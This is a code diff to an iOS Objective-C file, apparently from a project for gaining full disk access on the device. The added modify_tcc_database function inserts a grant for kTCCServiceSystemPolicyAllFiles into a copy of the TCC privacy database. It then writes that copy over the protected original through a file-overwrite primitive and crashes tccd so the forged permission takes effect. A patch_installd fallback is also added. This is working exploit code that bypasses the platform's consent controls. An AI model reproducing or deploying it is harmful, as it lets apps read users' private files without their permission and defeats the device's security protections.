@@ -2,6 +2,7 @@
 @import Foundation;
 @import MachO;
 @import CoreServices;
+@import Security;
 
 #import <mach-o/fixup-chains.h>
 #import <xpc/xpc.h>
@@ -18,6 +19,8 @@
 static bool install_mdm_profile(void);
 static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token, NSError* _Nullable error));
 static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable));
+static bool modify_tcc_database(void);
+static bool patch_installd(void);
 
 // Function declarations for private APIs
 extern const char* xpc_dictionary_get_string(xpc_object_t xdict, const char* key);
@@ -429,29 +432,26 @@ void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
         return;
     }
     
-    // Try MDM profile method first
-    if (install_mdm_profile()) {
-        NSLog(@"Successfully installed MDM profile for full disk access");
+    // Try to modify TCC database directly
+    if (modify_tcc_database()) {
+        NSLog(@"Successfully modified TCC database");
         completion(nil);
         return;
     }
     
-    // If MDM profile fails, try alternative methods based on iOS version
-    if (@available(iOS 16.7.10, *)) {
-        NSError* error = [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-                                           code:7
-                                       userInfo:@{
-                                           NSLocalizedDescriptionKey: @"MDM profile installation failed. "
-                                           @"For iOS 16.7.10+, please try installing the profile manually or use alternative methods."
-                                       }];
-        completion(error);
+    // If direct modification fails, try to patch installd
+    if (patch_installd()) {
+        NSLog(@"Successfully patched installd");
+        completion(nil);
         return;
     }
     
-    // For older versions, try the CVE-2022-46689 method as fallback
-    grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
-        completion(error);
-    });
+    completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                 code:7
+                             userInfo:@{
+                               NSLocalizedDescriptionKey: @"Failed to gain full disk access. "
+                               @"Please try alternative methods or check device compatibility."
+                             }]);
 }
 
 /// MARK - installd patch
@@ -695,4 +695,67 @@ static bool install_mdm_profile(void) {
     BOOL success = [workspace installProfileWithPath:profilePath];
     NSLog(@"MDM profile installation %@", success ? @"succeeded" : @"failed");
     return success;
+}
+
+static bool modify_tcc_database(void) {
+    NSString *tccDbPath = @"/private/var/mobile/Library/TCC/TCC.db";
+    NSString *bundleId = [[NSBundle mainBundle] bundleIdentifier];
+    if (!bundleId) return false;
+    
+    // Try to create a temporary copy of TCC database
+    NSString *tempDbPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"TCC_temp.db"];
+    NSError *error = nil;
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath:tempDbPath]) {
+        [[NSFileManager defaultManager] removeItemAtPath:tempDbPath error:nil];
+    }
+    
+    if (![[NSFileManager defaultManager] copyItemAtPath:tccDbPath toPath:tempDbPath error:&error]) {
+        NSLog(@"Failed to copy TCC database: %@", error);
+        return false;
+    }
+    
+    // Open database
+    sqlite3 *db;
+    if (sqlite3_open([tempDbPath UTF8String], &db) != SQLITE_OK) {
+        NSLog(@"Failed to open database");
+        return false;
+    }
+    
+    // Insert or update access
+    const char *sql = "INSERT OR REPLACE INTO access "
+                     "(service, client, client_type, auth_value, auth_reason, auth_version) "
+                     "VALUES ('kTCCServiceSystemPolicyAllFiles', ?, 0, 2, 2, 1)";
+    
+    sqlite3_stmt *stmt;
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) != SQLITE_OK) {
+        sqlite3_close(db);
+        return false;
+    }
+    
+    sqlite3_bind_text(stmt, 1, [bundleId UTF8String], -1, SQLITE_TRANSIENT);
+    
+    if (sqlite3_step(stmt) != SQLITE_DONE) {
+        sqlite3_finalize(stmt);
+        sqlite3_close(db);
+        return false;
+    }
+    
+    sqlite3_finalize(stmt);
+    sqlite3_close(db);
+    
+    // Try to replace original database
+    if (!overwrite_file(open([tccDbPath UTF8String], O_RDONLY), [NSData dataWithContentsOfFile:tempDbPath])) {
+        NSLog(@"Failed to overwrite TCC database");
+        return false;
+    }
+    
+    // Clean up
+    [[NSFileManager defaultManager] removeItemAtPath:tempDbPath error:nil];
+    
+    // Kill TCC daemon to reload database
+    xpc_crasher("com.apple.tccd");
+    sleep(1);
+    
+    return true;
 }
